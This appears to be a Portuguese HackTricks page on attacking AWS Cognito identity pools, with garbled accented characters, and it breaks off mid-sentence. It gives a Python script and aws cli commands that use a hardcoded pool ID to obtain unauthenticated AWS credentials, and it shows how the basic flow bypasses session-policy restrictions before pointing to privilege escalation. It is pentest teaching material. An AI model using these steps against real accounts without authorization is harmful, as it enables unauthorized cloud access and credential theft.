# Pools de Identidade Cognito

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegrama**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

Com um pool de identidade, seus usu√°rios podem **obter credenciais tempor√°rias da AWS para acessar servi√ßos da AWS**, como Amazon S3 e DynamoDB. Os pools de identidade suportam usu√°rios convidados an√¥nimos, bem como os seguintes provedores de identidade que voc√™ pode usar para autenticar usu√°rios para pools de identidade:

* Pools de usu√°rios da Amazon Cognito
* Login social com Facebook, Google, Login com Amazon e Entrar com a Apple
* Provedores de identidade OpenID Connect (OIDC)
* Provedores de identidade SAML
* Identidades autenticadas pelo desenvolvedor

### Cognito Sync

Para gerar sess√µes de pool de identidade, voc√™ primeiro precisa **gerar um ID de identidade**. Este ID de identidade √© a **identifica√ß√£o da sess√£o desse usu√°rio**. Essas identifica√ß√µes podem ter at√© 20 conjuntos de dados que podem armazenar at√© 1 MB de pares chave-valor.

Isso √© **√∫til para manter informa√ß√µes de um usu√°rio** (que sempre usar√° o mesmo ID de identidade).

Al√©m disso, o servi√ßo **cognito-sync** √© o servi√ßo que permite **gerenciar e sincronizar essas informa√ß√µes** (nos conjuntos de dados, enviando informa√ß√µes em fluxos e mensagens SNS...).

## Acessando Fun√ß√µes IAM

### N√£o autenticado

A √∫nica coisa que um atacante precisa saber para **obter credenciais da AWS** em um aplicativo Cognito como usu√°rio n√£o autenticado √© o **ID do pool de identidade**, e esse **ID deve ser codificado** no aplicativo web / m√≥vel para que ele o use. Um ID se parece com isso: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (n√£o √© poss√≠vel for√ßar a for√ßa bruta).

{% hint style="success" %}
O **papel IAM Cognito n√£o autenticado criado via √© chamado** por padr√£o `Cognito_<nome do pool de identidade>Unauth_Role`
{% endhint %}

Se voc√™ encontrar um ID de pool de identidade codificado e permitir usu√°rios n√£o autenticados, poder√° obter credenciais da AWS com:

```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
    print(f"Not valid id: {id_pool_id}")
    exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```

Ou voc√™ pode usar os seguintes **comandos aws cli**:

```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```

{% hint style="warning" %}
Observe que, por padr√£o, um usu√°rio cognitivo n√£o autenticado **N√ÉO PODE ter nenhuma permiss√£o, mesmo que tenha sido atribu√≠do por meio de uma pol√≠tica**. Verifique a se√ß√£o a seguir.
{% endhint %}

### Fluxo de autentica√ß√£o aprimorado vs b√°sico

A se√ß√£o anterior seguiu o **fluxo de autentica√ß√£o aprimorado padr√£o**. Este fluxo define uma pol√≠tica de sess√£o **restritiva** [**pol√≠tica de sess√£o**](../../aws-basic-information/#session-policies) para a sess√£o de fun√ß√£o IAM gerada. Essa pol√≠tica permitir√° apenas que a sess√£o [**use os servi√ßos desta lista**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (mesmo que a fun√ß√£o tenha acesso a outros servi√ßos).

No entanto, h√° uma maneira de contornar isso, se o **pool de identidade tiver o "Fluxo B√°sico (Cl√°ssico)" habilitado**, o usu√°rio poder√° obter uma sess√£o usando esse fluxo que **n√£o ter√° essa pol√≠tica de sess√£o restritiva**.

{% code overflow="wrap" %}
```bash
# Obter ID de autentica√ß√£o
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Obter token de login
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use o token de login para obter credenciais de sess√£o IAM
## Se voc√™ n√£o sabe o role_arn, use o fluxo aprimorado anterior para obt√™-lo
aws sts assume-role-with-web-identity --role-arn <role_arn> --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Se voc√™ receber este **erro**, √© porque o **fluxo b√°sico n√£o est√° habilitado (padr√£o)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Tendo um conjunto de credenciais IAM, voc√™ deve verificar [quais acessos voc√™ tem](../../#whoami) e tentar [escalar privil√©gios](../../aws-privilege-escalation/).

### Autenticado

{% hint style="info" %}
Lembre-se de que os **usu√°rios autenticados** provavelmente receber√£o **